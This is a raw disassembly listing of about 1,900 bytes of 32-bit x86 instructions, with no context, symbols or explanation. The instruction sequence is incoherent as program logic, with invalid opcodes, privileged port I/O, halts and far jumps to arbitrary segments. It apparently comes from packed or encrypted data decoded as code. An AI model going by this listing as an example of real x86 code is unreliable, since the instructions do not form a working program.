  412f57:	sbb    ch,BYTE PTR [edi+ecx*1]
  412f5a:	cdq    
  412f5b:	fcomp  QWORD PTR [edi+0x56]
  412f5e:	call   0x3b427796
  412f63:	cmc    
  412f64:	push   esi
  412f65:	mov    ebp,edi
  412f67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f68:	add    al,0x2f
  412f6a:	dec    ebx
  412f6b:	test   BYTE PTR [eax+0xc],bl
  412f6e:	repz stc 
  412f70:	ret    0x5b93
  412f73:	mov    ebx,0x440ce77f
  412f78:	xlat   BYTE PTR ds:[ebx]
  412f79:	pop    es
  412f7a:	sub    eax,0xb938a24c
  412f7f:	or     dh,BYTE PTR ds:0xb772a408
  412f85:	inc    esi
  412f86:	jle    0x412fd4
  412f88:	and    esi,ecx
  412f8a:	push   ds
  412f8b:	hlt    
  412f8c:	ror    DWORD PTR [ebp+0x52cb77d1],0xb2
  412f93:	(bad)  
  412f94:	cmp    al,0xa7
  412f96:	adc    ch,BYTE PTR [eax+0x366a5df4]
  412f9c:	ja     0x412fb5
  412f9e:	pushf  
  412f9f:	mov    ecx,0x7aab20e7
  412fa4:	js     0x413011
  412fa6:	mov    al,ds:0xee81e82
  412fab:	xor    al,0xd4
  412fad:	cmp    al,0xb7
  412faf:	xchg   ch,ch
  412fb1:	(bad)  
  412fb2:	push   ecx
  412fb3:	pop    ds
  412fb4:	push   esp
  412fb5:	repz dec esi
  412fb7:	mov    eax,ebp
  412fb9:	or     esp,DWORD PTR [edx+0x60edf2bb]
  412fbf:	ficom  DWORD PTR [edx-0xc827914]
  412fc5:	loop   0x412fad
  412fc7:	push   ecx
  412fc8:	dec    ecx
  412fc9:	or     DWORD PTR [esp+eax*8+0x36],esi
  412fcd:	xor    DWORD PTR [ebx+eiz*2],ebx
  412fd0:	xor    dh,BYTE PTR ds:0x67f1b43
  412fd6:	ja     0x413008
  412fd8:	xchg   BYTE PTR [ebx+ecx*2+0x12],cl
  412fdc:	cli    
  412fdd:	xchg   edx,eax
  412fde:	out    dx,eax
  412fdf:	mov    esi,DWORD PTR [eax-0x5e]
  412fe2:	dec    ecx
  412fe3:	lahf   
  412fe4:	mov    esp,0x5e5e1241
  412fe9:	in     al,dx
  412fea:	fsubr  QWORD PTR [edi]
  412fec:	xchg   edi,eax
  412fed:	adc    dh,BYTE PTR [ebp-0x2c178e0d]
  412ff3:	and    al,0x6f
  412ff5:	inc    ecx
  412ff6:	mov    ebp,0x3195edd9
  412ffb:	fsub   DWORD PTR [ebp+0x9]
  412ffe:	std    
  412fff:	add    dh,BYTE PTR [ebp+0x22]
  413002:	rol    DWORD PTR [edx+esi*2+0x6512e68e],1
  413009:	dec    ebx
  41300a:	ja     0x413000
  41300c:	je     0x41306a
  41300e:	xchg   ebp,eax
  41300f:	pop    esi
  413010:	push   es
  413011:	loope  0x413020
  413013:	pop    es
  413014:	dec    esi
  413015:	out    0x72,al
  413017:	xchg   esi,eax
  413018:	ja     0x412fb7
  41301a:	mov    ch,0x52
  41301c:	outs   dx,BYTE PTR ds:[si]
  41301e:	lahf   
  41301f:	out    dx,eax
  413020:	adc    DWORD PTR [edi+eiz*2],edx
  413023:	out    dx,al
  413024:	int    0xdb
  413026:	mov    DWORD PTR [eax+0x41],eax
  413029:	add    BYTE PTR [eax+ebx*2+0x30],dh
  41302d:	mov    bl,0x70
  41302f:	cwde   
  413030:	push   ds
  413031:	push   ds
  413032:	adc    al,0x30
  413034:	pop    ds
  413035:	test   al,0xb6
  413037:	xchg   ebx,eax
  413038:	fdiv   QWORD PTR [esi+0x3c7296b2]
  41303e:	xchg   ecx,eax
  41303f:	lods   eax,DWORD PTR ds:[esi]
  413040:	hlt    
  413041:	les    esp,FWORD PTR ds:[ebx]
  413044:	dec    ebp
  413045:	outs   dx,BYTE PTR ds:[esi]
  413046:	gs jle 0x41305f
  413049:	push   ebp
  41304a:	xor    eax,0xd77f4b02
  41304f:	jb     0x413083
  413051:	cwde   
  413052:	push   edi
  413053:	loop   0x412ffd
  413055:	push   ecx
  413056:	nop
  413057:	push   edx
  413058:	hlt    
  413059:	and    dh,ah
  41305b:	sbb    ah,BYTE PTR [ebp-0x302d7716]
  413061:	dec    esp
  413062:	xchg   esi,eax
  413063:	adc    al,0x81
  413065:	mov    edi,0x26504b84
  41306a:	adc    al,0x6e
  41306c:	push   edx
  41306d:	mov    bl,0xa3
  41306f:	mov    eax,0xca27e864
  413074:	push   edx
  413075:	fidiv  DWORD PTR [esi-0x5]
  413078:	aaa    
  413079:	push   edx
  41307a:	dec    eax
  41307b:	mov    eax,0x7a14e7a4
  413080:	rol    bl,0x16
  413083:	add    dl,BYTE PTR [edi-0x57]
  413086:	push   esi
  413087:	outs   dx,BYTE PTR ds:[esi]
  413088:	mov    bh,0x7c
  41308a:	lea    esi,[esi+0x3a]
  41308d:	pop    esi
  41308e:	pop    ds
  41308f:	pop    ebx
  413090:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413091:	add    al,0xfa
  413093:	out    0x10,eax
  413095:	fild   QWORD PTR [ecx-0x56]
  413098:	out    0x2c,eax
  41309a:	lock adc al,0xed
  41309d:	in     al,dx
  41309e:	repnz les ebp,FWORD PTR [esi]
  4130a1:	shr    DWORD PTR [ebx],cl
  4130a3:	xor    BYTE PTR [eax+0x5b5b9f6e],ch
  4130a9:	inc    edi
  4130aa:	xor    BYTE PTR [esi],ch
  4130ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130ad:	fs mov cl,0x7e
  4130b0:	mov    edi,0x8b58851c
  4130b5:	sbb    ebp,DWORD PTR [edx+ebp*1+0x4677c5ff]
  4130bc:	pop    esp
  4130bd:	pop    esi
  4130be:	fldz   
  4130c0:	es mov edx,0xcb6a4562
  4130c6:	ins    DWORD PTR es:[edi],dx
  4130c7:	push   ecx
  4130c8:	fs adc dh,ah
  4130cb:	mov    dh,0x49
  4130cd:	in     eax,dx
  4130ce:	aad    0xd7
  4130d0:	iret   
  4130d1:	xchg   ebx,eax
  4130d2:	mov    BYTE PTR [eax-0x31cff6ad],al
  4130d8:	push   esi
  4130d9:	and    bl,al
  4130db:	adc    al,0x1e
  4130dd:	lods   eax,DWORD PTR ds:[esi]
  4130de:	retf   0x7868
  4130e1:	inc    esi
  4130e2:	scas   eax,DWORD PTR es:[edi]
  4130e3:	inc    sp
  4130e5:	jg     0x41315f
  4130e7:	retf   0xd073
  4130ea:	or     dh,0xc2
  4130ed:	jmp    0xa0aac68d
  4130f2:	or     al,0x21
  4130f4:	jmp    0xbad3:0x5edbe800
  4130fb:	inc    esp
  4130fc:	pop    ebp
  4130fd:	test   al,0xcb
  4130ff:	ss jns 0x41310f
  413102:	das    
  413103:	sbb    al,0x62
  413105:	mov    cl,bh
  413107:	jns    0x4130cf
  413109:	pop    esi
  41310a:	shr    BYTE PTR [ebx+ebp*4+0x57b8d76c],0xa6
  413112:	retf   0xd5c
  413115:	and    cl,bh
  413117:	mul    eax
  413119:	test   BYTE PTR [eax+edx*8+0x2f],bl
  41311d:	adc    edi,edx
  41311f:	mov    al,ds:0xe1b1de84
  413124:	jmp    0x413137
  413126:	ret    0xa255
  413129:	imul   edx,DWORD PTR [eax+0x3ae24d2f],0x6b
  413130:	imul   edi,DWORD PTR [ebx+0x15],0x923d4515
  413137:	ds ja  0x4130eb
  41313a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41313b:	mov    ecx,0xf424ca9
  413140:	sbb    bh,BYTE PTR [ecx+eiz*1+0xd]
  413144:	shl    BYTE PTR [ecx],cl
  413146:	in     al,dx
  413147:	mov    BYTE PTR [eax+0x58],cl
  41314a:	arpl   WORD PTR ds:0x569cb9d0,cx
  413150:	jbe    0x413190
  413152:	xor    ebx,DWORD PTR [edi+0x68341f7b]
  413158:	sti    
  413159:	jecxz  0x413156
  41315b:	mov    esp,DWORD PTR [ecx-0x26]
  41315e:	mov    bh,0x8c
  413160:	mov    esp,0x8117fa22
  413165:	xor    al,0xaf
  413167:	pop    edx
  413168:	inc    esi
  413169:	jmp    0x2c143569
  41316e:	fwait
  41316f:	inc    eax
  413170:	fwait
  413171:	mov    bl,BYTE PTR [esi+0x5d]
  413174:	outs   dx,DWORD PTR ds:[esi]
  413175:	sbb    ecx,DWORD PTR [ebx-0x5758216]
  41317b:	cli    
  41317c:	push   esi
  41317d:	out    0xf8,eax
  41317f:	xlat   BYTE PTR ds:[bx]
  413181:	(bad)  
  413182:	fidivr WORD PTR [edx+0x3f014370]
  413188:	pushf  
  413189:	aad    0xe5
  41318b:	jmp    0x77ba:0xf88f804b
  413192:	cmc    
  413193:	in     al,dx
  413194:	sub    ah,BYTE PTR [ecx+0x87c72d1]
  41319a:	mov    ecx,DWORD PTR [edx]
  41319c:	repz popa 
  41319e:	mov    ss,WORD PTR [edx]
  4131a0:	mov    edx,0x83120fdc
  4131a5:	ins    DWORD PTR es:[edi],dx
  4131a6:	enter  0x54cf,0xef
  4131aa:	outs   dx,DWORD PTR ds:[esi]
  4131ab:	pop    edi
  4131ac:	adc    BYTE PTR [ebp+eiz*1+0x7a270ab5],0x58
  4131b4:	jg     0x4131c3
  4131b6:	jns    0x4131ab
  4131b8:	mul    BYTE PTR [esi]
  4131ba:	rcr    DWORD PTR [ebp-0x14],cl
  4131bd:	push   esp
  4131be:	(bad)  
  4131bf:	repz dec ecx
  4131c1:	sahf   
  4131c2:	aas    
  4131c3:	or     dh,BYTE PTR [edi]
  4131c5:	(bad)  
  4131c6:	mov    ch,0x55
  4131c8:	push   0x433b1356
  4131cd:	aaa    
  4131ce:	and    eax,0x5e5e8947
  4131d3:	inc    edi
  4131d4:	fadd   DWORD PTR [edx]
  4131d6:	mov    cs,ebx
  4131d8:	daa    
  4131d9:	jecxz  0x4131b2
  4131db:	loop   0x413202
  4131dd:	xchg   esi,eax
  4131de:	sbb    al,dh
  4131e0:	add    esp,eax
  4131e2:	add    DWORD PTR [ebx],edi
  4131e4:	or     ebp,DWORD PTR [edx+ebp*1+0x2a]
  4131e8:	bound  edi,QWORD PTR [edx-0x4]
  4131eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131ec:	add    al,0x61
  4131ee:	lea    ebx,[ebp+0x20]
  4131f1:	fidiv  DWORD PTR [esi+0x47]
  4131f4:	int    0x92
  4131f6:	xor    ah,BYTE PTR [edx]
  4131f8:	mov    dl,0xd4
  4131fa:	outs   dx,BYTE PTR ds:[esi]
  4131fb:	sub    ebp,DWORD PTR [esi-0x69]
  4131fe:	dec    esp
  4131ff:	inc    edx
  413200:	xchg   ecx,eax
  413201:	jle    0x4131be
  413203:	push   cs
  413204:	pop    eax
  413205:	test   eax,0x14fd854
  41320a:	or     BYTE PTR [edx-0x9a23a5d],dl
  413210:	cmp    al,0xc8
  413212:	adc    eax,0x9429fe79
  413217:	inc    ebx
  413218:	pop    ds
  413219:	sahf   
  41321a:	xchg   edx,eax
  41321b:	inc    ebx
  41321c:	xchg   esi,eax
  41321d:	es stos BYTE PTR es:[edi],al
  41321f:	sub    DWORD PTR [esi-0x1c3503a3],eax
  413225:	imul   esp,ecx,0xffffffbb
  413228:	mov    ch,0xc9
  41322a:	aad    0x25
  41322c:	push   cx
  41322e:	retf   
  41322f:	aas    
  413230:	pop    ebp
  413231:	pop    edx
  413232:	aaa    
  413233:	xchg   ebx,eax
  413234:	or     al,0x50
  413236:	arpl   WORD PTR [edi+ecx*8],dx
  413239:	imul   esp,DWORD PTR [edi-0x199415eb],0xfb2cb61c
  413243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413244:	dec    ebp
  413245:	and    al,0x7d
  413247:	mov    ecx,0xdf1f0f0a
  41324c:	scas   al,BYTE PTR es:[edi]
  41324d:	aaa    
  41324e:	dec    ecx
  41324f:	mov    edi,0x7e8ed225
  413254:	dec    edi
  413255:	and    DWORD PTR [edi],ebx
  413257:	ror    bl,1
  413259:	and    ah,BYTE PTR ds:0x44d3a771
  41325f:	jle    0x41324a
  413261:	sub    esp,DWORD PTR [edi-0x70e0e0d9]
  413267:	push   ecx
  413268:	popf   
  413269:	xchg   esp,eax
  41326a:	fdivp  st(7),st
  41326c:	out    dx,eax
  41326d:	sbb    ebp,esi
  41326f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413270:	push   ss
  413271:	fdivr  st(0),st
  413273:	xchg   edx,eax
  413274:	add    bl,dl
  413276:	sub    eax,0xf2b85eee
  41327b:	repz dec ebx
  41327d:	xor    al,0x35
  41327f:	or     DWORD PTR [ecx],ebx
  413281:	mov    DWORD PTR ds:0xc6d080fe,edx
  413287:	jbe    0x41322d
  413289:	mov    ebx,0xd63e742a
  41328e:	leave  
  41328f:	pop    eax
  413290:	gs push cs
  413292:	xchg   BYTE PTR [ebp-0x51f899b9],ch
  413298:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413299:	push   esi
  41329a:	stc    
  41329b:	mov    ebx,0x3ecd015e
  4132a0:	popf   
  4132a1:	cmp    bl,bl
  4132a3:	or     eax,0x822d04de
  4132a8:	push   eax
  4132a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132aa:	cmp    ecx,DWORD PTR [edi-0x3b]
  4132ad:	psadbw mm2,QWORD PTR [edi]
  4132b0:	xchg   ebx,eax
  4132b1:	enter  0xf85c,0x9a
  4132b5:	sahf   
  4132b6:	retf   
  4132b7:	cmp    BYTE PTR [ecx-0x33981d8f],0xae
  4132be:	ins    BYTE PTR es:[edi],dx
  4132bf:	mov    bh,ah
  4132c1:	adc    esi,edi
  4132c3:	in     al,0x96
  4132c5:	adc    eax,0x3fc8d8b1
  4132ca:	retf   0x9861
  4132cd:	xor    al,cl
  4132cf:	jmp    0xe350:0xf46c89cd
  4132d6:	enter  0xc58,0xcb
  4132da:	fild   DWORD PTR [ebx+0x4a]
  4132dd:	sbb    eax,0x4933ceb0
  4132e2:	dec    ebx
  4132e3:	out    0x6,eax
  4132e5:	xchg   edi,eax
  4132e6:	lods   al,BYTE PTR ds:[esi]
  4132e7:	cwde   
  4132e8:	inc    ebp
  4132e9:	jno    0x413328
  4132eb:	imul   esi,esp,0x39295d29
  4132f1:	pop    ebx
  4132f2:	pop    edx
  4132f3:	push   eax
  4132f4:	pop    es
  4132f5:	or     al,0xa2
  4132f7:	add    DWORD PTR [edi],ecx
  4132f9:	int    0xd2
  4132fb:	mov    ebp,0xeec3048f
  413300:	outs   dx,DWORD PTR ds:[esi]
  413301:	nop
  413302:	jecxz  0x413308
  413304:	adc    eax,0x172bbad3
  413309:	cdq    
  41330a:	std    
  41330b:	lock xor ebx,edx
  41330e:	out    0x83,al
  413310:	and    ebx,DWORD PTR [edi+0x559fd404]
  413316:	daa    
  413317:	xchg   edi,eax
  413318:	mov    eax,0xd9fcf490
  41331d:	int    0x6f
  41331f:	sar    BYTE PTR [esi-0x5f],cl
  413322:	shr    DWORD PTR [ebp+0x73],cl
  413325:	push   esi
  413326:	add    al,0x37
  413328:	out    dx,eax
  413329:	loop   0x413320
  41332b:	add    al,0x64
  41332d:	adc    esi,DWORD PTR [ecx]
  41332f:	call   esi
  413331:	iret   
  413332:	sbb    ebp,edi
  413334:	add    ebp,eax
  413336:	jp     0x413381
  413338:	add    al,0x21
  41333a:	call   0xedb1:0x158a3bbc
  413341:	(bad)  
  413342:	jecxz  0x413386
  413344:	cmp    edi,eax
  413346:	ror    DWORD PTR [esi],cl
  413348:	adc    DWORD PTR [eax],ebx
  41334a:	cld    
  41334b:	push   esi
  41334c:	jnp    0x4133bd
  41334e:	dec    ebp
  41334f:	jns    0x4133cb
  413351:	or     BYTE PTR [eax+eiz*8],ah
  413354:	into   
  413355:	(bad)
  413358:	data16 fs lahf 
  41335b:	hlt    
  41335c:	push   ss
  41335d:	pop    esi
  41335e:	in     eax,dx
  41335f:	push   ds
  413360:	pusha  
  413361:	inc    eax
  413362:	js     0x413368
  413364:	jmp    0x3ae3:0x146e76a9
  41336b:	xchg   ebx,eax
  41336c:	push   edx
  41336d:	out    0x91,eax
  41336f:	adc    edi,DWORD PTR [edi+0x3bd99e0e]
  413375:	popa   
  413376:	je     0x41334c
  413378:	add    BYTE PTR [edx+0x1e97e7bd],bh
  41337e:	daa    
  41337f:	cli    
  413380:	push   ebp
  413381:	popf   
  413382:	mov    esi,0x18a8ea7b
  413387:	sub    DWORD PTR [esp+eax*8-0x5df881cf],ecx
  41338e:	lods   eax,DWORD PTR ds:[esi]
  41338f:	sbb    DWORD PTR [eax-0x666f2370],ebx
  413395:	pop    esi
  413396:	jp     0x41332a
  413398:	sbb    esi,DWORD PTR [edi+0x55]
  41339b:	sbb    bh,BYTE PTR [esi+0x65]
  41339e:	mov    dl,0xae
  4133a0:	lods   eax,DWORD PTR ds:[esi]
  4133a1:	push   ds
  4133a2:	ja     0x4133f8
  4133a4:	jmp    0xea38adc
  4133a9:	ins    DWORD PTR es:[edi],dx
  4133aa:	jnp    0x4133b8
  4133ac:	inc    ebp
  4133ad:	pop    eax
  4133ae:	push   0x9
  4133b0:	add    eax,DWORD PTR [edx]
  4133b2:	lds    edi,FWORD PTR [ebx+0x19]
  4133b5:	sbb    edi,edx
  4133b7:	cmp    edx,DWORD PTR [ebx-0xdc4422b]
  4133bd:	adc    eax,0x8ec4919c
  4133c2:	test   BYTE PTR [esi+eax*8+0x1],dl
  4133c6:	inc    eax
  4133c7:	in     al,0xc2
  4133c9:	dec    esp
  4133ca:	cmc    
  4133cb:	pop    ecx
  4133cd:	(bad)  
  4133ce:	(bad)  
  4133cf:	mov    edx,0xa0b020d7
  4133d4:	mov    ds:0x4f58ba32,al
  4133d9:	cs cs ror DWORD PTR cs:[edi+0x46],1
  4133df:	mov    ds:0xc4064513,al
  4133e4:	out    dx,eax
  4133e5:	sub    BYTE PTR [ecx+0x41],ah
  4133e8:	adc    edx,ecx
  4133ea:	test   BYTE PTR [edi+0x12],al
  4133ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133ee:	adc    DWORD PTR [ecx+0x37],0x33
  4133f2:	push   edi
  4133f3:	rcr    esp,1
  4133f5:	repz mov ebx,0x6c1ff451
  4133fb:	inc    edi
  4133fc:	jno    0x4133ca
  4133fe:	test   BYTE PTR [eax+0x3b],cl
  413401:	(bad)  
  413402:	jbe    0x4133f4
  413404:	jae    0x41341f
  413406:	pop    ebx
  413407:	mov    WORD PTR [esi+edx*4],?
  41340a:	cmp    BYTE PTR [esi],bh
  41340c:	mov    cl,0x7b
  41340e:	add    al,0x91
  413410:	add    ah,ah
  413412:	sub    esi,DWORD PTR [ebx-0x1bb75d6b]
  413418:	in     al,0xf4
  41341a:	sub    al,0xd7
  41341c:	scas   al,BYTE PTR es:[edi]
  41341d:	in     eax,0xa7
  41341f:	xor    eax,0x6ec7762
  413424:	jle    0x413470
  413426:	ins    DWORD PTR es:[edi],dx
  413427:	sbb    BYTE PTR [edi-0x14],al
  41342a:	cdq    
  41342b:	add    ch,BYTE PTR [esi-0x19441df1]
  413431:	pushf  
  413432:	stos   DWORD PTR es:[edi],eax
  413433:	mov    ecx,0x4dd1f3ed
  413438:	shr    bh,cl
  41343a:	imul   esi,DWORD PTR [eax+0x7125f328],0xffffffee
  413441:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413442:	add    edx,DWORD PTR [eax-0x4eb99233]
  413448:	aam    0x9
  41344a:	in     al,dx
  41344b:	and    ebp,DWORD PTR [edi-0x6f]
  41344e:	mov    eax,DWORD PTR ds:0xc5b527bc
  413454:	pop    edi
  413455:	inc    esp
  413456:	stc    
  413457:	mov    edi,0x4f2cad5
  41345c:	sub    BYTE PTR [edx-0x3dac0069],dl
  413462:	lods   al,BYTE PTR fs:[esi]
  413464:	fstp   TBYTE PTR [edx]
  413466:	mov    bh,0x5f
  413468:	ins    BYTE PTR es:[edi],dx
  413469:	les    ebp,FWORD PTR [edi+ebp*1-0x11f806b5]
  413470:	and    cl,BYTE PTR [ebx]
  413472:	jo     0x413411
  413474:	xchg   ebp,eax
  413475:	jnp    0x4133fe
  413477:	or     al,0x33
  413479:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41347a:	inc    esi
  41347b:	ror    DWORD PTR [ebp-0x4c3177c5],0xd2
  413482:	sbb    cl,BYTE PTR [eax+0xa]
  413485:	lds    esi,FWORD PTR [ebp-0x3]
  413488:	sbb    BYTE PTR [eax-0xa],cl
  41348b:	jmp    0x413471
  41348d:	(bad)  
  41348e:	xchg   ecx,eax
  41348f:	xchg   ebx,eax
  413490:	neg    dl
  413492:	retf   0xe9fa
  413495:	mov    ebp,DWORD PTR [eax-0x376fc299]
  41349b:	mov    ecx,0xe0afe015
  4134a0:	dec    esi
  4134a1:	je     0x413451
  4134a3:	jb     0x4134ce
  4134a5:	ror    DWORD PTR ds:0x8edf0da5,0xb7
  4134ac:	(bad)  
  4134ad:	pop    ecx
  4134ae:	inc    eax
  4134af:	sbb    bl,BYTE PTR [ebp+eiz*1+0x4b]
  4134b3:	stos   BYTE PTR es:[edi],al
  4134b4:	sbb    al,0xe6
  4134b6:	mov    esi,0x2e1b84d9
  4134bb:	rcr    BYTE PTR [ebp+0x20],1
  4134be:	cld    
  4134bf:	inc    eax
  4134c0:	in     al,dx
  4134c1:	xor    dh,BYTE PTR [esi]
  4134c3:	sar    DWORD PTR [ebp-0x15],0xdb
  4134c7:	das    
  4134c8:	add    ebx,DWORD PTR ss:0x8ded1cb2
  4134cf:	add    dh,BYTE PTR [edx-0x7a]
  4134d2:	test   eax,0x45965d3f
  4134d7:	aam    0xb7
  4134d9:	retf   
  4134da:	sbb    eax,0x40df5d02
  4134df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134e0:	aam    0xd7
  4134e2:	sub    bh,dh
  4134e4:	sahf   
  4134e5:	shl    DWORD PTR [edi-0x72],1
  4134e8:	ficomp WORD PTR [edx+0x6121ce9]
  4134ee:	dec    ecx
  4134ef:	mov    esp,0x9f5f87bb
  4134f4:	inc    esi
  4134f5:	out    0xad,eax
  4134f7:	xor    bl,BYTE PTR [ebp+0x70]
  4134fa:	mov    edx,0x3f6f9ce0
  4134ff:	mov    bh,ch
  413501:	fimul  DWORD PTR [eax+0x33]
  413504:	push   ds
  413505:	pushf  
  413506:	jne    0x4134f7
  413508:	pop    ds
  413509:	pusha  
  41350a:	ss xchg edx,eax
  41350c:	scas   eax,DWORD PTR es:[edi]
  41350d:	adc    bl,ah
  41350f:	iret   
  413510:	or     edx,ebp
  413512:	xor    edx,esi
  413514:	ret    0xa514
  413517:	loopne 0x4134ce
  413519:	in     al,0xf8
  41351b:	xchg   esi,eax
  41351c:	ror    BYTE PTR [ebx],1
  41351e:	inc    edx
  41351f:	mov    bh,0xaa
  413521:	and    BYTE PTR [ebx],bh
  413523:	ins    DWORD PTR es:[edi],dx
  413524:	mov    cl,0xd5
  413526:	shl    dl,0x44
  413529:	adc    eax,0x2e049416
  41352e:	sbb    al,0xc2
  413530:	stc    
  413531:	adc    BYTE PTR [ebp-0x6eb93aaf],dl
  413537:	push   esp
  413538:	ins    BYTE PTR es:[edi],dx
  413539:	pop    ds
  41353a:	out    0x65,eax
  41353c:	and    eax,0xd34bcd07
  413541:	ins    DWORD PTR es:[edi],dx
  413542:	retf   
  413543:	not    DWORD PTR [edi]
  413545:	sbb    ebx,ecx
  413547:	inc    ecx
  413548:	add    DWORD PTR [ecx],edi
  41354a:	jp     0x413553
  41354c:	ficom  DWORD PTR [ebp+0x5]
  41354f:	xchg   esp,eax
  413550:	js     0x41356b
  413552:	enter  0x4542,0xc8
  413556:	les    ecx,FWORD PTR [ecx+0x468cdacb]
  41355c:	loope  0x4134f7
  41355e:	jl     0x4135c3
  413560:	pop    esi
  413561:	jo     0x413589
  413563:	fild   QWORD PTR [esi]
  413565:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413566:	test   eax,0x530581ca
  41356b:	rol    DWORD PTR [esi+edi*8-0x26959fae],0x6f
  413573:	imul   ecx,DWORD PTR [eax+0x22],0x13
  413577:	or     DWORD PTR [eax],edi
  413579:	dec    esi
  41357a:	fiadd  WORD PTR [edx]
  41357c:	test   eax,0xba38246d
  413581:	jmp    0x413589
  413583:	int3   
  413584:	or     edi,DWORD PTR [ebp+0x6a]
  413587:	scas   eax,DWORD PTR es:[edi]
  413588:	out    dx,eax
  413589:	xchg   ebp,eax
  41358a:	mul    BYTE PTR [edx-0x26]
  41358d:	pop    edx
  41358e:	fisttp WORD PTR [edx+0x2355f96c]
  413594:	xchg   edx,eax
  413595:	daa    
  413596:	addr16 ret 
  413598:	cmp    DWORD PTR [edi-0x7d],edi
  41359b:	repnz or DWORD PTR [esi],edi
  41359e:	into   
  41359f:	and    DWORD PTR [edx-0x27],0xd
  4135a3:	cld    
  4135a4:	mov    dl,BYTE PTR [edx+0x714c687e]
  4135aa:	sub    eax,0xf791373
  4135af:	cmp    dl,bh
  4135b1:	jnp    0x41362a
  4135b3:	push   esp
  4135b4:	leave  
  4135b5:	into   
  4135b6:	push   0xf704918c
  4135bb:	ja     0x41360e
  4135bd:	mov    bl,BYTE PTR [ecx+0x378a12ac]
  4135c3:	cmp    BYTE PTR [ebx+0x7fdc4134],bh
  4135c9:	mov    ebx,0xebc2c946
  4135ce:	mov    gs,ecx
  4135d0:	sub    BYTE PTR [edx+eax*4-0x7b1f70e7],0xd2
  4135d8:	cmp    eax,0x8b5249ba
  4135dd:	xchg   ebx,eax
  4135de:	and    dl,bl
  4135e0:	xlat   BYTE PTR ds:[ebx]
  4135e1:	dec    eax
  4135e2:	dec    edx
  4135e3:	repz retf 0x2a28
  4135e7:	jnp    0x41357e
  4135e9:	xchg   DWORD PTR [bx+si+0x19],esp
  4135ed:	scas   eax,DWORD PTR es:[edi]
  4135ee:	test   eax,0xdd95caad
  4135f3:	mov    ?,WORD PTR [ecx+0x55]
  4135f6:	int3   
  4135f7:	int    0xcc
  4135f9:	mov    esp,0xe3cffb46
  4135fe:	sub    DWORD PTR [eax+eiz*1],edi
  413601:	loope  0x41365e
  413603:	pop    edx
  413604:	pop    ds
  413605:	xor    al,0x4f
  413607:	fcmovu st,st(6)
  413609:	div    BYTE PTR [ebx-0x3c9acf6e]
  41360f:	pop    edi
  413610:	jns    0x4135ba
  413612:	pop    edi
  413613:	jne    0x4135b0
  413615:	lea    edi,[ebx]
  413617:	adc    DWORD PTR [eax-0x74697431],edx
  41361d:	sti    
  41361e:	mov    al,ds:0xa68a35c3
  413623:	cld    
  413624:	(bad)  
  413625:	cld    
  413626:	ss mov edx,0x8368a4d6
  41362c:	ret    
  41362d:	in     al,0xa7
  41362f:	fst    QWORD PTR [esi-0x1c]
  413632:	pop    ebx
  413633:	(bad)  
  413634:	fsubr  st,st(1)
  413636:	shl    DWORD PTR ds:0x3acf4906,0xe
  41363d:	jns    0x413656
  41363f:	into   
  413640:	and    edx,DWORD PTR [eax]
  413642:	adc    ah,BYTE PTR [edx-0xf]
  413645:	in     al,dx
  413646:	push   ecx
  413647:	sub    eax,0xdef90142
  41364c:	inc    eax
  41364d:	pusha  
  41364e:	and    BYTE PTR [eax],al
  413650:	js     0x413642
  413652:	jp     0x413666
  413654:	test   eax,0x30e70601
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	xor    al,0x2a
  41365c:	adc    DWORD PTR [ecx],eax
  41365e:	adc    DWORD PTR [ebx+0x60034302],0x26
  413665:	into   
  413666:	push   0x80ba8ff5
  41366b:	pusha  
  41366c:	sar    al,0xe5
  41366f:	inc    edx
  413670:	jb     0x4136c7
  413672:	or     DWORD PTR [eax],esi
  413674:	dec    ebx
  413675:	add    al,0x77
  413677:	adc    al,0x65
  413679:	sbb    BYTE PTR [ecx+0x12cc9686],cl
  41367f:	pop    es
  413680:	add    eax,0x596dcce2
  413685:	fst    DWORD PTR [eax]
  413687:	sbb    ah,BYTE PTR [ebx-0x19]
  41368a:	xor    ebx,DWORD PTR [esi+0x771d2864]
  413690:	out    0x66,al
  413692:	(bad)  
  413693:	aad    0x8a
  413695:	shl    BYTE PTR [ebp-0x3a],0x2c
  413699:	xchg   ebp,eax
  41369a:	popa   
  41369b:	mul    ebx
  41369d:	ret    
  41369e:	pop    esp
  41369f:	inc    esi
  4136a0:	mov    al,ds:0x38d7699b
  4136a5:	dec    ecx
  4136a6:	xchg   ebx,eax
  4136a7:	push   esi
  4136a8:	neg    ch
  4136aa:	(bad)  
  4136ab:	xlat   BYTE PTR ds:[ebx]
  4136ac:	push   cs
  4136ad:	xchg   ebx,ebx
  4136af:	cs out 0x6c,al
  4136b2:	imul   ebp,DWORD PTR fs:[edi+0x36],0x322be29f
  4136ba:	je     0x413646
  4136bc:	sahf   
  4136bd:	mov    edi,edi
  4136bf:	pop    ecx
  4136c0:	jmp    0x872d:0xe3537070
  4136c7:	xor    eax,0x8cb5743d
  4136cc:	push   0x4e
  4136ce:	mov    edi,DWORD PTR [ebx]
  4136d0:	adc    BYTE PTR [eax],ch
  4136d2:	sbb    ebp,DWORD PTR [esi-0x1aaf88fa]
  4136d8:	mov    BYTE PTR [ebp-0x70],ah
  4136db:	push   ds
  4136dc:	inc    edx
  4136dd:	icebp  
  4136de:	mov    ds:0x1341d7a0,eax
  4136e3:	mov    al,0x63
  4136e5:	stc    
  4136e6:	lock pop esi
  4136e8:	cwde   
  4136e9:	jnp    0x41367f
  4136eb:	pcmpgtb mm7,mm0
  4136ee:	push   ebp
  4136ef:	stos   BYTE PTR es:[edi],al
  4136f0:	inc    esp
  4136f1:	outs   dx,BYTE PTR ds:[esi]
  4136f2:	lea    edi,[ebp*2-0x307416d2]
  4136f9:	add    ebp,0xffffff8f
